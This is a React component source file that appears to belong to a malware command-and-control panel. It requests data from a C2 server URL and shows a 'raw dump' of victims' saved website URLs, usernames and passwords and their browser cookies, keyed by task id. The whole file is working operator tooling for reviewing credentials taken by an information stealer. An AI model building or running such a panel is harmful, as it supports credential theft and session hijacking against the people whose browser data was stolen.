import { useEffect, useState } from "react";
import "./Stylesheets/passworddisplay.css"

function Passworddisplay(props) {
  const [cookies, setCookies] = useState([
    { task_id: "", path: "", hostkey: "", value: "" },
  ]);
  const [passwords, setPasswords] = useState([
    { task_id: "", path: "", url: "", username: "", password: "" },
  ]);
  const [loading, setIsLoading] = useState(true);
  const [error, setError] = useState();
  const [message, setMessage] = useState();

  let id = props.id;

  async function getData(id) {
    setIsLoading(true);
    try {
      let response = await fetch(
        process.env.REACT_APP_C2URL + "/display_passwords",
        {
          method: "POST",
          mode: "cors",
          body: JSON.stringify({ id: id }),
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
      let respJSON = await response.json();
      let data = respJSON;

      setPasswords(data.passwords);
      setCookies(data.cookies);
      if (response.status === 200) {
      } else {
        setMessage("Error getting data");
      }
    } catch (error) {
      console.log("error: " + error.message);
      setError(error.message);
    } finally {
      setIsLoading(false);
    }
  }

  useEffect(() => {
    getData(id);
  }, [id]);

  if (loading) return <div></div>;

  return (
    <div className="container">
      <h1>RAW DUMP OF PASSWORDS</h1>
      <h2>Passwords</h2>
      <div className="columns">
        {passwords.map((row, iterator) => (
          <div key={iterator} className="column col-12 tiny-text">
            <div className="divider"></div>
        
            <b>ID: </b>{row.task_id} <b>Path: </b> {row.path} <b>URL: </b> {row.url} <b>USERNAME: {row.username} </b> <b>PASSWORD: {row.password} </b>
          </div>
        ))}
      </div>
      <h2>Cookies</h2>
      <div className="columns">
        {cookies &&
          cookies.map((row, iterator) => (
            <div key={iterator} className="column col-12 tiny-text">
              <div className="divider"></div>
              <b>Task ID: </b>{row.task_id} <b>Path: </b> {row.path} <b>Hostkey: </b>{row.hostkey} <b>Value: {row.value}</b>
            </div>
          ))}
      </div>
    </div>
  );
}

export default Passworddisplay;
